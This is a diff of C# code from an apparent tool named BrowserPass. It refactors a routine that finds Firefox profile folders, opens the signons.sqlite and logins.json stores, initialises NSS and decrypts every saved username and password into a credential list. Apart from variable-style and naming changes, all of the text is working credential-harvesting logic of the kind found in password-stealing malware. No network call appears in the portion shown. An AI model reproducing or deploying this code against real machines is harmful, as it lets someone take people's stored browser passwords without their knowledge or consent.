@@ -13,17 +13,17 @@ namespace BrowserPass
         { 
             string signonsFile = null;
             string loginsFile = null;
-            bool signonsFound = false;
-            bool loginsFound = false;
-            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
+            var signonsFound = false;
+            var loginsFound = false;
+            var dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
 
             var logins = new List<CredentialModel>();
             if (dirs.Length == 0)
                 return logins;
 
-            foreach (string dir in dirs)
+            foreach (var dir in dirs)
             {
-                string[] files = Directory.GetFiles(dir, "signons.sqlite");
+                var files = Directory.GetFiles(dir, "signons.sqlite");
                 if (files.Length > 0)
 				{
                     signonsFile = files[0];
@@ -40,7 +40,7 @@ namespace BrowserPass
 
                 if (loginsFound || signonsFound)
                 {
-                    FFDecryptor.NSS_Init(dir);
+                    FfDecryptor.NSS_Init(dir);
                     break;
                 }
 
@@ -58,8 +58,8 @@ namespace BrowserPass
                         {
                             while (reader.Read())
                             {
-                                string username = FFDecryptor.Decrypt(reader.GetString(0));
-                                string password = FFDecryptor.Decrypt(reader.GetString(1));
+                                var username = FfDecryptor.Decrypt(reader.GetString(0));
+                                var password = FfDecryptor.Decrypt(reader.GetString(1));
                                 
                                 logins.Add(new CredentialModel
                                 {
@@ -78,16 +78,16 @@ namespace BrowserPass
             if (loginsFound)
             {
                 FFLogins ffLoginData;
-                using (StreamReader sr = new StreamReader(loginsFile))
+                using (var sr = new StreamReader(loginsFile))
                 {
-                    string json = sr.ReadToEnd();
+                    var json = sr.ReadToEnd();
                     ffLoginData = JsonConvert.DeserializeObject<FFLogins>(json);
                 }
 
-                foreach (LoginData loginData in ffLoginData.logins)
+                foreach (var loginData in ffLoginData.logins)
                 {
-                    string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
-                    string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
+                    var username = FfDecryptor.Decrypt(loginData.encryptedUsername);
+                    var password = FfDecryptor.Decrypt(loginData.encryptedPassword);
                     logins.Add(new CredentialModel
                     {
                         Username = username,
